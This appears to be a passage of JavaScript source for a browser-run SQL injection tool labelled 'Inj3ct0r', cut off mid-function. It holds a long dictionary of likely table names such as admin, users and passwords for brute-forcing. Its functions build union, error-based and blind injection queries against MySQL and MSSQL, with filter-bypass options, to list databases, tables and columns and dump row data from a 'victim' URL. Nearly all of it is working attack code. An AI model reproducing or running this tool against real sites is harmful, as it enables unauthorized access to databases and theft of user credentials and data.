	<div id='box' class='button' style='position: fixed; width: 70%; right: auto; height: 400px; left: 15%; z-index: 9999;'>\
		<textarea style='width: 98%; height: 390px;'><textarea>\
	</div>\
</div>\
";
$("body").html(body);

var TablesDic = "order,orders,user,order,username,usernames,admin,admins,users,manager,account,accounts,member,login,logins,members,tbl_user,tbl_users,tbl_admin,tbl_admins,tbl_member,tbl_members,tbladmins,memberlist,tbluser,tblusers,tblmanager,tblmanagers,tblclients,tblservers,adminuser,usertbl,userstbl,admintbl,adminstbl,id,tuser,tusers,uid,userid,user_id,auid,adminpass,LoginID,FirstName,LastName,cms_user,cms_member,cms_users,cms_members,cms_admin,cms_admins,user_admin,user_info,user_list,user_login,user_logins,user_names,userrights,userinfo,userlist,webadmin,webadmins,Webmaster,Webuser,product,products,tblproducts,tblproduct,tbl_tbadmin,Adminlogin,useraccount,nguoidung,quanly,quantri,dangnhap,taikhoan,taikhoanquantri,useraccounts,nguoidungs,tbuser,tblogin,tbadmin,tbaccount,tbuseraccount,tbnguoidung,tbllogin,tbladmin,tblaccount,tbluseraccount,tblnguoidung,tbusers,tblogins,tbadmins,tbaccounts,tbuseraccounts,tbnguoidungs,tbllogins,tblaccounts,tbluseraccounts,tblnguoidungs,tb_account,tb_useraccount,tb_nguoidung,tbl_login,tbl_account,tbl_useraccount,tbl_nguoidung,tb_logins,tb_accounts,tb_useraccounts,tb_nguoidungs,tbl_logins,tbl_accounts,tbl_useraccounts,tbl_nguoidungs,tb_admin,tb_administrator,tb_admins,tb_login,tb_member,tb_members,tb_user,tb_username,tb_usernames,tb_users,login_admin,login_admins,login_user,login_users,lost_pass,lost_passwords,lostpass,lostpasswords,password,pwd,pwds,a_admin,adm,modir,modiriat,karbar,karbaran,admin_user,admin_userinfo,administrator,adminid,admin_id,adminuserid,admin_userid,AdminUID,adminusername,admin_username,adminname,admin_name,usr,usr_n,usrname,usr_name,usrnam,name,student,students,user_name,useradmin,apwd,adminpaw,adminpwd,admin_pwd,admin_pass,adminpassword,admin_password,usrpass,usr_pass,pass,userpass,user_pass,dbaccount,dbstudent,dbstudents,dbadmin,useres,dbuser,dbusers,person,personal,dbpersoon,list,lists,dblist,userpassword,user_password,sort,userpwd,user_pwd,SecurityLevel,LastLoginDate,LoginIP,pword,_wfspro_admin,4images_users,ad,Konto,Konten,admin_login,admin_psw,administer,administrable,administrate,administration,administrators,verwalten,verwaltet,administrieren,Verwaltung,Administratoren,adminrights,adminpsw,adminupass,Kunst,articles,Artikel,aut,author,autore,backend,Autor,backend_users,backenduser,article,Buch,chat_config,chat_messages,chat_users,client,chat,clients,Kunden,art,tblnews,superuser,sysadmin,sysadmins,sysuser,sysusers,x_admin,article_admin,bbs,book,clubconfig,company,usuario,config,banner,dbadmins,info,m_admin,manage,movie,movies,news,options,general,settings,setting,ACT_INFO,upload,uploads,file,files,akhbar,reguser,sb_host_admin,Firma,contact,contacts,content,contenu,control,Kontakt,Kontakte,Inhalt,Kontrolle,cpg_config,cpg132_users,controle,Country,customer,customers,Kunde,customers_basket,dealer,dealers,diary,download,H\E4ndler,Tagebuch,herunterladen,Dragon_users,e107.e107_user,e107_user,forum.ibf_members,fusion_user_groups,fusion_users,dw,Event,gl,glmm,gly,us,stnuser,stuser,stusers,stuseres,staff,dbstaff,db_staff,staff_db,db,database,databases,test_user,user_test,test_users,users_test,group,groups,Gruppe,Gruppen,ibf_admin_sessions,ibf_conf_settings,ibf_members,ibf_members_converge,ibf_sessions,icq,guanli,guanliyuan,h_admin,images,index,Bilder,ipb.ibf_members,ipb_sessions,joomla_users,jos_blastchatc_users,jos_comprofiler_members,jos_contact_details,jos_joomblog_users,jos_messages_cfg,jos_moschat_users,jos_users,knews_lostpass,korisnici,Mitgliederbereich,kpro_adminlogs,kpro_user,links,key,keywords,Anmeldung,logon,logs,Protokolle,main,haupts\E4chlich,mambo_session,mambo_users,mb_users,Mitglied,Mitgliederliste,Mitglieder,minibbtable_users,mima,mm,mpassword,musername,Film,Filme,mybb_users,mysql,mysql.user,names,nc,new,Namen,news_lostpass,newsletter,nuke_authors,nuke_bbconfig,nuke_config,nuke_popsettings,nuke_users,obb_profiles,order,orders,parol,partner,partners,passes,passwords,Auftrag,Bestellungen,P\E4sse,Passwort,Passw\F6rter,perdorues,perdoruesit,phorum_session,phorum_user,phorum_users,phpads_clients,phpads_config,phpbb_users,phpBB2.forum_users,phpBB2.phpbb_users,phpmyadmin.pma_table_info,pma_table_info,poll_user,punbb_users,power,powers,psw,pswd,pw,pwd1,reg_user,reg_users,registered,jhu,webapps,ASP,ASP.NET,Microsoft,logging,log,sing,singup,singin,register,registeration,reg,registriert,regusers,root,roots,session,sessions,Tagung,Sitzungen,Einstellungen,shop.cards,shop.orders,site_login,site_logins,sitelogin,sitelogins,sites,Standorte,smallnuke_members,smf_members,SS_orders,statistics,Subjects,Statistiken,sys,system,sysconstraints,syssegments,Systemadministratoren,systime,table,tables,Tisch,Tabellen,tbl,tbl_clients,tbl_client,tblclient,tblConfigs,test,usebb_members,Titel,u,u_n,u_name,u_p,u_pass,Benutzer,usercontrol,user_pw,Benutzerliste,userlogins,userpasswd,usr_pw,usrs,Benutzername,Benutzernamen,vb_user,vbulletin_session,vbulletin_user,voodoo_members,vip,webmasters,webusers,Webbenutzer,xar_roles,xoops_bannerclient,xoops_users,yabb_settings,yabbse_settings,sb_host_adminActiveDataFeed,ActiveDataFeed,Category,Kategorie,CategoryGroup,ChicksPass,ClickTrack,Land,CountryCodes1,CustomNav,DataFeedPerformance1,DataFeedPerformance2,DataFeedPerformance2_incoming,DataFeedShowtag1,DataFeedShowtag2,DataFeedShowtag2_incoming,dtproperties,Event_backup,Event_Category,EventRedirect,Events_new,Genre,JamPass,MyTicketek,MyTicketekArchive,Passwords by usage count,Passw\F6rter durch Nutzung z\E4hlen,PerfPassword,PerfPasswordAllSelected,Promotion,ProxyDataFeedPerformance,ProxyDataFeedShowtag,ProxyPriceInfo,Region,SearchOptions,Series,Suchoptionen,Serie,Sheldonshows,categoria,StateList,States,SubCategory,Survey,Staaten,UnterkKlasse,Anhand des Sachgebietes,Umfrage,SurveyAnswer,SurveyAnswerOpen,SurveyQuestion,SurveyRespondent,tblRestrictedPasswords,tblRestrictedShows,Ticket System Acc Numbers,TimeDiff,Titles,Ticket-System ACC-Nummern,ToPacmail1,ToPacmail2,Total Members,UserPreferences,uvw_Category,uvw_Pref,uvw_Preferences,Venue,venues,Veranstaltungsort,Veranstaltungsorte,VenuesNew,X_3945,stone list,Stein Liste,tblArtistCategory,tblArtists,tblLayouts,tblLogBookAuthor,tblLogBookEntry,tblLogBookImages,tblLogBookImport,tblLogBookUser,tblMails,tblNewCategory,tblOrders,tblStoneCategory,tblStones,tblWishList,VIEW1,Ansicht1,viewLogBookEntry,viewStoneArtist,vwListAllAvailable,CC_info,CC_username,utilisateur,trier,compte,comptes,administrer,administrables,administrateur,administrateurs,auteur,livre,entreprise,concessionnaire,concessionnaires,journal,telecharger,groupe,groupes,liens,connexion,principal,gestionnaire,membre,membres,films,nom,noms,ordre,commandes,partenaire,partenaires,passe,asse,personnes handicapes,enregistrs,paramtres,statistiques,super,tester,nom d'utilisateur,les noms d'utilisateur,utilisateurs,intranet_users,utlisateur,Catogorie,Pays,Sujets,Sondage,Titres,Nombre total de membres,Lieu de la manifestation,Lieux,pierre liste,Affichage1Affichage1edu,win,pc,windows,mac,edu,bayviewpath,bayview,server,slserver,ColdFusion8,ColdFusion,Cold,Fusion8,Fusion,ststaff,sb_host_adminAffichage1,Affichage1,yhm,yhmm,Affichage1name,sb_host_adminAffichage1name".split(',');
/***********************************************************
Function
************************************************************/
function t2h(str){
	var r=new Array();
	var j='';
	r.push('0x');
	for(var i=0;i<str.length;i++){
		r.push(str.charCodeAt(i).toString(16));
	}
	return r.join(j);
}
/*function h2t(str){
	var r="";
	var e=str.length;
	var i=0;
	while(i<=e){
		r+=String.fromCharCode("0x"+str.substring(i,i+2));
		i+=2;
	}
	return r;
}*/
function CallBacker(callbackfs,param){
	var str= "callbackfs(";
	if(param.length){
		for(i=0;i<param.length;i++){
			str +="param["+i+"],";
		}
		str = str.slice(0,-1);
	}
	str += ");";
	eval(str);
}

function global(){
	VTM.sleep = parseInt($.trim($("#sleeptime").val()));
	VTM.offset = parseInt($.trim($("#offset").val()));
	VTM.limit = parseInt($.trim($("#limit").val()));
	if(!$('#url').val())
	{
		alert('unknow victim!');
		return;
	}
	if(VTM.request == 'get')
	{
		URL = $('#url').val().split("SQLI");
	}else{
		URL = $('#victimurl #body #data').val().split("SQLI");
		URL[2] = $('#url').val();
	}
	if(typeof URL[0] == 'undefined'){
		URL[0] = $.trim($('#url').val());
	}
	if(typeof URL[1] == 'undefined'){
		URL[1]="";
	}
	VTM.method = $.trim($("select[name='method'] option:selected").attr('value'));
	if($("input[name='type']:checked").val()== '0')
	{
		VTM.type = 'mysql';
	}else
	{
		VTM.type = 'mssql';
	}
	VTM.bypass = $.trim($("select[name='bypass'] option:selected").attr('value'));
}
function Image(e,i,type)
{
	e.css("background","#3A3A3A no-repeat url('"+IMG[i]+"')");
	e.css("background-position",type);
}
/************************************************************************
AJAX
*************************************************************************/
var AJAX = [];
function SQLIAjax(dt,completefs,sleep,type){
	if($.trim($('#requestbtn').html()) == 'continue'){
		AJAX = {dt:dt,completefs:completefs,sleep:sleep};
		return;
	}
	TMP.requestnum++;
	$('#requestnum').html(TMP.requestnum+' request sent');
	setTimeout(function(){
		if(type=='get'){
			$.ajax({
				url: dt,
				cache: true,
				complete:completefs
			});
		}else if(type == 'post'){
			$.ajax({
				url: URL[2],
				type: "POST",
				data: dt,
				complete: completefs
			});
		}else if(type == 'head'){
			$.ajax({
				type: "HEAD",
				url: dt,
				complete:completefs
			});
		}
	},sleep*1000);
}
/******************************************************************************************************
blind SQL
*******************************************************************************************************/
var BLD = {
top: 0,
bot:0,
jump: 30,
false:0
};

function Blinder(inject,callback){
	inject = SQL[VTM.bypass].select+SQL.space+SQL[VTM.bypass].group_concat+"(C)"+SQL.space+SQL[VTM.bypass].from+SQL.space+"("+inject+")"+SQL[VTM.bypass].as+SQL.space+"T";
	SQL.Data = "";
	BLD.top =0;
	BLD.bot = 90;
	BLD.jump = 30;
	if(!BLD.false){
		var query = SQL.space+SQL[VTM.bypass].and+SQL.space+SQL[VTM.bypass].ascii+"("+SQL[VTM.bypass].substring+"(("+inject+"),1,1))";
		SQLIAjax(URL[0]+query+"<0"+URL[1],
			function(xhr){
				BLD.false = xhr.responseText.length;
			}
			,VTM.sleep,VTM.request
		);
	}
	BlindSubChar(inject,1,callback,0);
}
function BlindSubChar(inject,count,callback,key){
	callback[3].push(SQL.Data);
	CallBacker(callback[2],callback[3]);
	var query = SQL.space+SQL[VTM.bypass].and+SQL.space+SQL[VTM.bypass].ascii+"("+SQL[VTM.bypass].substring+"(("+inject+"),"+count+",1))";
	SQLIAjax(URL[0]+query+">"+BLD.bot+URL[1],
		function(xhr){
			if(Math.abs(xhr.responseText.length - BLD.false) > VTM.offset){ //true
				BLD.bot += BLD.jump;
				BlindSubChar(inject,count,callback,1);
			}else{
				BLD.top = BLD.bot;
				BLD.bot -= BLD.jump;
				if(key){
					BLD.jump = parseInt(BLD.jump/2);
					BlindGetChar(inject,count,callback);
				}else if(BLD.top <= 0){
					var data = {responseText : SQL.start+SQL.Data+SQL.stop};
					callback[1].push(data);
					CallBacker(callback[0],callback[1]);
					SQL.Data = "";
				}else{
					BlindSubChar(inject,count,callback,0);
				}
			}
		}
		,VTM.sleep,VTM.request
	);
}

function BlindGetChar(inject,count,callback){
	var query = SQL.space+SQL[VTM.bypass].and+SQL.space+SQL[VTM.bypass].ascii+"("+SQL[VTM.bypass].substring+"(("+inject+"),"+count+",1))";
	SQLIAjax(URL[0]+query+">"+(BLD.bot+BLD.jump)+URL[1],
		function(xhr){
			if(Math.abs(xhr.responseText.length - BLD.false) > VTM.offset){ //true
				BLD.bot += BLD.jump;
			}else{
				BLD.top = BLD.bot+BLD.jump;
			}
			BLD.jump = parseInt((BLD.top - BLD.bot)/2);
			if(BLD.jump == 0){
				if(BLD.top <= 0)
				{
					var data = {responseText : SQL.start+SQL.Data+SQL.stop};
					callback[1].push(data);
					CallBacker(callback[0],callback[1]);
					SQL.Data = "";
				}else{
					SQL.Data += String.fromCharCode(BLD.bot+BLD.jump+1);
					BLD.top =0;
					BLD.bot = 90;
					BLD.jump = 30;
					BlindSubChar(inject,count+1,callback,0);
				}
			}else{
				BlindGetChar(inject,count,callback);
			}
		},VTM.sleep,VTM.request
	);
}
/*****************************************
Error Base
******************************************/
function ErrorGetData(inject,count,callback)
{
	if(SQL.Data.split(SQL.stop).length < 2)
	{
		var query = URL[0]+"suBs%54r(" +inject + ","+ count +",64)"+ URL[1];
		SQLIAjax(query,
			function(xhr){
				if(typeof xhr.responseText.split(SQL.ErrorChar[0])[1] != 'undefined'){
					SQL.Data += xhr.responseText.split(SQL.ErrorChar[0])[1].split(SQL.ErrorChar[1])[0];
					if(SQL.Data != ""){
						ErrorGetData(inject,count + 50,callback);
						return;
					}
				}else{
					ErrorSuccessful(SQL.Data,callback);
				}
			},VTM.sleep,VTM.request
		);
	}else{
		ErrorSuccessful(SQL.Data,callback);
	}
}
function ErrorSuccessful(data,callback){
	data = {responseText : data};
	callback(data);
	SQL.Data = "";
}
/*****************************************
database global function
******************************************/
function Add(data,activefs,loop,callback){
	data = data.responseText.split(SQL.start);
	if(typeof data[1] == "undefined"){
		activefs(2);
	}else{
		data = data[1].split(SQL.stop)[0].split(',');
		for (i=0; i<data.length; i++){
			if($.trim(data[i]) !=""){
				loop(data[i]);
			}
		}
		if((data.length == 1 && data[0] =='')||data.length < VTM.limit){
			activefs(1);
		}else{
			DATA.count += VTM.limit;
			setTimeout(function(){
				callback(DATA.count);
			},VTM.sleep*1000);
		}
	}
}
/*****************************************
database
******************************************/
function ActiveDBs(i)
{
	Image($("#selectdbs"),i,"left");
	RestartBtn();
}
function QueryCreater(data){
	return "("+SQL[VTM.bypass].select+SQL.space+SQL[VTM.bypass].concat+"("+t2h(SQL.start)+",("+SQL[VTM.bypass].unhex_hex+"(("+SQL[VTM.bypass].select+SQL.space+SQL[VTM.bypass].group_concat+"(C)"+SQL.space+SQL[VTM.bypass].from+SQL.space+"("+data+")"+SQL[VTM.bypass].as+SQL.space+"T"+")))),"+t2h(SQL.stop)+"))";
}
function AppendDB(data){
	$("#dblist #body").append("<div class='db'><div class='dbname active'>"+data+"</div><div class='tbs'></div>");
}
function AddDB(dbs){
	Add(dbs,ActiveDBs,AppendDB,MySQLGetDBs);
}
function MySQLGetDBs(count)
{
	if(VTM.type == 'mysql'){
		var injectdbs = SQL[VTM.bypass].select+SQL.space+SQL[VTM.bypass].schema_name+SQL.space+SQL[VTM.bypass].as+SQL.space+"C"+SQL.space+SQL[VTM.bypass].from+SQL.space+SQL[VTM.bypass].information_schema+"."+SQL[VTM.bypass].schemata+SQL.space+SQL[VTM.bypass].limit+SQL.space+count+","+VTM.limit;
	}else{
		var injectdbs = ";begin declare @r varchar(8000);set @r="+t2h(SQL.start)+";SELECT TOP "+VTM.limit+" @r=@r%2bcast(schema_name as varchar(8000))%2b',' FROM information_schema.schemata WHERE schema_name NOT IN(SELECT TOP "+count+" schema_name FROM information_schema.schemata ORDER BY 1) ORDER BY 1;select @r=@r%2bcast("+t2h(SQL.stop)+" as varchar(100));select convert(int,rtrim(@r));end;--sp_password";
	}
	if(VTM.method == 'union'){
		injectdbs = URL[0] + QueryCreater(injectdbs) + URL[1];
		SQLIAjax(injectdbs,AddDB,0,VTM.request);
	}else if(VTM.method == 'error'){
		ErrorGetData(QueryCreater(injectdbs),1,AddDB);
	}else if(VTM.method == 'blind'){
		Blinder(injectdbs,
		[
			AddDB,[],//available
			function(){//loading
			},[],function(){//error
			},[]
		]);
	}
}

/*******************************************
table function
*******************************************/
function ActiveTBs(i)
{
	Image(DATA.dbhandler.children(".dbname"),i,"right");
	RestartBtn();
}
function AppendTB(data){
	DATA.dbhandler.children('.tbs').append("<div class='tb'><div class='tbname active'>"+data+"</div><div class='cls'></div></div>");
}
function AddTB(tbs){
	Add(tbs,ActiveTBs,AppendTB,MySQLGetTBs);
}
function MySQLGetTBs(count)
{
	if(VTM.type == 'mysql'){
		var injecttbs = SQL[VTM.bypass].select+SQL.space+SQL[VTM.bypass].table_name+SQL.space+SQL[VTM.bypass].as+SQL.space+"C"+SQL.space+SQL[VTM.bypass].from+SQL.space+SQL[VTM.bypass].information_schema+"."+SQL[VTM.bypass].tables+SQL.space+SQL[VTM.bypass].where+SQL.space+SQL[VTM.bypass].table_schema+"%3d"+t2h(DATA.database)+SQL.space+SQL[VTM.bypass].limit+SQL.space+count+","+VTM.limit;
	}else{
		var injecttbs = ";begin declare @r varchar(8000);set @r="+t2h(SQL.start)+";SELECT TOP "+VTM.limit+" @r=@r%2bcast(table_name as varchar(8000))%2b',' FROM information_schema.tables WHERE table_schema in('"+DATA.database+"') and table_name NOT IN(SELECT TOP "+count+" table_name FROM information_schema.tables where table_schema in('"+DATA.database+"') ORDER BY 1) ORDER BY 1;select @r=@r%2bcast("+t2h(SQL.stop)+" as varchar(100));select convert(int,rtrim(@r));end;--sp_password";
	}
	if(VTM.method == 'union'){
		injecttbs = URL[0] + QueryCreater(injecttbs) + URL[1];
		SQLIAjax(injecttbs,AddTB,0,VTM.request);
	}else if(VTM.method == 'error'){
		ErrorGetData(QueryCreater(injecttbs),1,AddTB);
	}else if(VTM.method == 'blind'){
		Blinder(injecttbs,
		[
			AddTB,[],//available
			function(){//loading
			},[],function(){//error
			},[]
		]);
	}
}
/*******************************************
column function
*******************************************/
function ActiveCLs(i)
{
	Image(DATA.tbhandler.children('.tbname'),i,"right");
	RestartBtn();
}

function RestartBtn()
{
	$("#startbtn").html('start');
	$("#checkallbtn").html('check all');
	$("#datalist #body").html("");
}
function AppendCL(data){
		DATA.tbhandler.children('.cls').append("<div class='clname active'><div class='clcheck'><input type='checkbox'></div><div id='cl"+i+"' class='cl'>"+data+"</div></div>");
}
function AddCL(cls){
	Add(cls,ActiveCLs,AppendCL,MySQLGetCLs);
}

function MySQLGetCLs(count)
{
	if(VTM.type == 'mysql'){
		var injectcls = SQL[VTM.bypass].select+SQL.space+SQL[VTM.bypass].column_name+SQL.space+SQL[VTM.bypass].as+SQL.space+"C"+SQL.space+SQL[VTM.bypass].from+SQL.space+SQL[VTM.bypass].information_schema+"."+SQL[VTM.bypass].columns+SQL.space+SQL.space+SQL[VTM.bypass].where+SQL.space+SQL[VTM.bypass].table_name+"%3d"+t2h(DATA.table)+SQL.space+SQL[VTM.bypass].and+SQL.space+SQL[VTM.bypass].table_schema+"%3d"+t2h(DATA.database)+SQL.space+SQL.space+SQL[VTM.bypass].limit+SQL.space+count+","+VTM.limit;
	}else{
		var injectcls = ";begin declare @r varchar(8000);set @r="+t2h(SQL.start)+";SELECT TOP "+VTM.limit+" @r=@r%2bcast(column_name as varchar(8000))%2b',' FROM information_schema.columns WHERE table_name in('"+DATA.table+"') and table_schema in('"+DATA.database+"') and column_name NOT IN(SELECT TOP "+count+" column_name FROM information_schema.columns where table_name in('"+DATA.table+"') and table_schema in('"+DATA.database+"') ORDER BY 1) ORDER BY 1;select @r=@r%2bcast("+t2h(SQL.stop)+" as varchar(100));select convert(int,rtrim(@r));end;--sp_password";
	}
	if(VTM.method == 'union'){
		injectcls = URL[0] + QueryCreater(injectcls) + URL[1];
		SQLIAjax(injectcls,AddCL,0,VTM.request);
	}else if(VTM.method == 'error'){
		ErrorGetData(QueryCreater(injectcls),1,AddCL);
	}else if(VTM.method == 'blind'){
		Blinder(injectcls,
		[
			AddCL,[],//available
			function(){//loading
			},[],function(){//error
			},[]
		]);
	}
}
/*******************************************
data function
*******************************************/
function AddRW(data)
{
	var rw = data.responseText.split(SQL.start);
	if(typeof rw[1] =='undefined'){
		return;
	}else{
		rw = rw[1].split(SQL.stop)[0].split(SQL.mid);
	}
	var tmp = rw.join('');
	if($.trim(tmp) =='') return;
	for(i = 0; i < rw.length ; i++)
	{
		rw[i] = $("#tmp").text(rw[i]).html();
	}
	var r = "<tr class='active'>";
	for(i = 0; i < rw.length; i++)
	{
		if(rw[i].length < 50){
			r += "<td>"+rw[i]+"</td>";
		}else{
			r += "<td class='clcompress'><span>"+rw[i].substring(0,50)+"...</span><span class='clfull hidden'>"+rw[i]+"</span></td>";
		}
	}
	r += "</tr>";
	$("#CLsDatas").append(r);
	DATA.count++;
	setTimeout(function(){
		MySQLGetRWs();
	},VTM.sleep*1000);
	
}
function MySQLGetRWs()
{
	if($.trim($("#startbtn").html()) == 'continue') return 0;
	if(VTM.type == 'mysql'){
		var bf = "("+SQL[VTM.bypass].concat+"("+t2h(SQL.start)+",(";
		var at = "),"+t2h(SQL.stop)+"))";
		
		var injectrow = SQL[VTM.bypass].select+SQL.space+SQL[VTM.bypass].unhex_hex+"("+SQL[VTM.bypass].concat+"(";
		for(c=0; c<DATA.columns.length; c++){
			injectrow += DATA.columns[c] + "," + t2h(SQL.mid) + ",";
		}
		injectrow = injectrow.slice(0,-(t2h(SQL.mid).length +2));
		injectrow += ")))"+SQL[VTM.bypass].as+SQL.space+"C"+SQL.space+SQL[VTM.bypass].from+SQL.space+DATA.database+"."+DATA.table+SQL.space+SQL[VTM.bypass].limit+SQL.space+DATA.count+",1";
	}else{
		
	}
	if(VTM.method == 'union'){
		injectrow = URL[0] +bf+ injectrow +at+ URL[1];
		SQLIAjax(injectrow,AddRW,VTM.sleep,VTM.request);
	}else if(VTM.method == 'error'){
		ErrorGetData(bf+injectrow+at,1,AddRW);
	}else if(VTM.method == 'blind'){
		Blinder(injectrow,
		[
			AddRW,[],//available
			function(){//loading
			},[],function(){//error
			},[]
		]);
	}
}
/***********************************************************
insert data
************************************************************/
$("#database").html("<div id='dblist' class='explore'><div id='head'>DataBase List</div><div id='body' style='height: 300px;'></div></div><div id='dboption' class='explore' style='width: 200px;'><div id='head'>Option</div><div id='body' style='height: 300px;'></div></div><div id='ijtmain' class='explore' style='float: none; width: auto;'><div id='head'>Inj3ct0r</div><div id='body' style='height: 300px;'><textarea id='ijtdata' style='width: 95%; height: 95%;'></textarea></div></div></div><div id='datalist' class='explore' style='float: left; width: 100%;'><div id='head'> DATA </div><div id='body' style='height: 100%;'></div></div>");
$.each($("#submain").children('div'),function(){
	var id = $(this).attr('id').toString();
	var text = $(this).attr('alt').toString();
	$('#menu').append("<div class='"+id+" button'>"+text+"</div>");
});
$("#submain").children('div').hide("fast");
$('#menu').after("<div id='requestbtn' class='button' style='float: right;'>pause</div><div id='requestnum' class='button' style='float: right;'>0 request sent</div>");
$("#requestbtn").live("click",function(){
	if($.trim($(this).html()) == 'pause'){
		$(this).html('continue');
	}else{
		$(this).html('pause');
		SQLIAjax(AJAX.dt,AJAX.completefs,AJAX.sleep,VTM.request);
	}
});

$("#victim").html("<div class='explore' id='victimurl' style='width:50%;'><div id='head'>URL</div><div id='body'  style='height: 100px;'><textarea id='url' style='width: 95%; height: 85px;'></textarea></div><div style='width:99%;' class='explore' id='foot'><div class='button' id='geturibtn' >Get URI</div><div class='button' id='checksqlibtn'>Check SQLi</div><div class='button' id='inserterrorbtn'>Insert Error</div><div class='button' id='requestmethodbtn'>POST Method</div></div></div><div class='explore' id='info' style='float: none; width: auto;'><div id='head'>Info</div><div id='body' style='height: 100px;'><div style='width: 50%;float:left'><div>Method : <select name='method'><option value='union'>Union</option><option value='error'>Error Base</option><option value='blind'>Blind</option><option value='brute'>Brute Force</option></select></div><div>Type : <label for='type0'><input id='type0' type='radio' name='type' value='0' checked>MySQL</label><label for='type1'><input id='type1' type='radio' name='type' value='1'>MSSQL</label></div><div>Bypass : <select name='bypass'><option value='none'>None</option><option value='hex'>Hex</option><option value='quote'>Quote</option></select></div><div>Sleep Time: <input id='sleeptime' style='width: 30px;'type='text' value='1'/></div></div><div style='width: 50%;float:left'><div>Offset: <input type='text' value='50' style='width: 30px;' id='offset'></div><div>Limit/Request: <input type='text' value='15' style='width: 30px;' id='limit'></div></div></div><div id='foot' class='explore' style='width:99%;'><div id='loadinjectorbtn' class='button'>Injector</div><div id='selectdbs' class='button'>Select DB</div><div class='button' id='getcurrenttbbtn'>Curent DB</div><div id='setdefault' class='button'>Set Default</div></div></div>");

$("#dboption #body").html("<input type='text' id='dbaddname' style='width: 180px; margin: 6px; float: left;'/><div class='button' id='adddatabasebtn'>Add Chil</div><div id='checkallbtn' class='button'>check all</div><div id='startbtn' class='button'>start</div>");
/***********************************************************
hooker
************************************************************/
$(".active").live({
	mouseenter: function()
	{
		$(this).animate({ paddingLeft: '15px' }, 50).css("border","1px solid #111").css("-moz-box-shadow","0 0 5px #222").css("-webkit-box-shadow","0 0 5px #222").css("box-shadow","0 0 5px #222").css("cursor","pointer").css("background-color","#555");
	},
	mouseleave:function()
	{
		$(this).animate({ paddingLeft: '8px' }, 50).css("border","1px solid #333").css("-moz-box-shadow","none").css("-webkit-box-shadow","none").css("box-shadow","none").css("cursor","auto").css("background-color","#3A3A3A");
	}
});

$("#menu div").live("click",function(){
	$("#submain").children('div').hide("fast");
	var id = $(this).attr('class').split(' ')[0].toString();
	var sub = $('#submain').children('#'+id.trim());
	sub.show("fast");
	if(sub.attr('hiddenvictim') =='1'){
		$("#victim").hide('fast');
	}else{
		$("#victim").show('fast');
	}
});
$("#selectdbs").live("click",function(){
	global();
	DATA.count=0;
	$("#menu .database").click();
	ActiveDBs(0);
	if($.trim($('#dblist #body').html()) == ""){
		MySQLGetDBs(0);
	}else{
		ActiveDBs(1);
	}
});
$("#setdefault").live("click",function(){
	global();
});
$(".dbname").live("click",function(){
	// global database
	DATA.dbhandler = $(this).parent();
	DATA.count=0;
	DATA.database = $.trim($(this).html());
	ActiveTBs(0);
	$("#dblist #body .dbname.dbselected").removeClass('dbselected');
	$(this).addClass('dbselected');
	
	var tbs = $(this).next();
	$('#dblist .db .tbs').hide('fast');
	tbs.show('fast');
	if($.trim(tbs.html()) != ""){
		ActiveTBs(1);
		return;
	}else if(VTM.method == 'brute'){
		Bruter();
	}else{
		MySQLGetTBs(0);
	}
});
/********************************
 * BruteForceTBs
 ********************************/
var BRUTE ={
	false:0
};
function Bruter(){
	Quoter(0,0,"hex",
		[
			function(){
				var query = URL[0]+QUOTE.avail.char[0]+SQL.space+SQL[VTM.bypass].and+SQL.space+SQL[VTM.bypass].exists+"("+SQL[VTM.bypass].select+SQL.space+"*"+SQL.space+SQL[VTM.bypass].from+SQL.space+"checkingbyvinakid"+")"+QUOTE.avail.end+QUOTE.avail.char[1]+URL[1];
				SQLIAjax(query,function(xhr){
					BRUTE.false = xhr.responseText.length;
					BruteForceTBs(0);
				},VTM.sleep,VTM.request);
			},[],
			function(){},[],
			function(){},[]
		]
	);
}
function BruteForceTBs(count){
	if(typeof TablesDic[count] =='undefined') return;
	var query = URL[0]+QUOTE.avail.char[0]+SQL.space+SQL[VTM.bypass].and+SQL.space+SQL[VTM.bypass].exists+"("+SQL[VTM.bypass].select+SQL.space+"*"+SQL.space+SQL[VTM.bypass].from+SQL.space+TablesDic[count]+")"+QUOTE.avail.end+QUOTE.avail.char[1]+URL[1];
	SQLIAjax(query,function(xhr){
		if(Math.abs(xhr.responseText.length - BRUTE.false) > VTM.offset){//true
			var tbs = {responseText:SQL.start+TablesDic[count]+SQL.stop};
			Add(tbs,ActiveTBs,function(data){
				AppendTB(data);
			},function(){});
		}
		BruteForceTBs(count+1);
	},VTM.sleep,VTM.request);
}

/*******************************
 * 
 */

$(".tbname").live("click",function(){
	DATA.tbhandler = $(this).parent();
	DATA.table = $.trim($(this).html());
	ActiveCLs(0);
	$("#dblist #body .tbs .tbname.tbselected").removeClass('tbselected');
	$(this).addClass('tbselected');

	var cls = $(this).next();
	$('.tb .cls').hide('fast');
	cls.show('fast');

	if($.trim(cls.html()) != ""){
		ActiveCLs(1);
		return;
	}else{
		MySQLGetCLs(0);
	}
});
$(".clname").live("click",function(){
	var check = $(this).find("input[type='checkbox']");
	if(check.attr('checked')){
		$(check).attr("checked",false);
	}else{
		$(check).attr("checked",true);
	}
	// reset check,start button
	RestartBtn();
});
$("#checkallbtn").live("click",function(){
	if($.trim($(this).html())=='check all'){
		$(".clcheck").children("input").attr("checked",true);
		$(this).html("uncheck all");
	}else{
		$(".clcheck").children("input").attr("checked",false);
		$(this).html("check all");
	}
	// reset start button
	$("#startbtn").html('start');
});
$("#startbtn").live("click",function(){
	if($.trim($(this).html())=='start'){
		$("#datalist #body").html("<table width='100%'><thead style='font-size: 14px; color: rgb(255, 222, 1);'><tr id='CLsNames'></tr></thead><tbody id='CLsDatas'></tbody></table>");
		DATA.count = 0;
		var tbl = "";
		var cls = new Array();
		DATA.tbhandler.children('.cls').children(".clname").each(function(i,e){
			if($(this).find("input[type='checkbox']").attr("checked"))
			{
				var cl = $.trim($(this).find(".cl").html());
				cls.push(cl);
				tbl += cl+ ",";
			}
		});
		var tbs = tbl.split(",");
		for(i=0; i<tbs.length - 1; i++)
		{
			$("#CLsNames").append("<th class='head'>"+tbs[i]+"</th>");
		}
		DATA.columns = cls;
		$(this).html("pause");
		MySQLGetRWs();
	}else if($.trim($(this).html())=='pause'){
		$(this).html("continue");
	}else{
		$(this).html("pause");
		MySQLGetRWs();
	}
});
$(".clcompress").live("dblclick",function(){
	var a = $("#alert");
	a.show("fast");
	a.children("#box").children("textarea").html($(this).children(".clfull").html());
});
$("#alert #bg").live("click",function(){
	$(this).parent("#alert").hide("fast");
});
$("#geturibtn").live("click",function(){
	$("#url").val(window.location.href);
});
$("#checksqlibtn").live("click",function(){
	var url = $("#url");
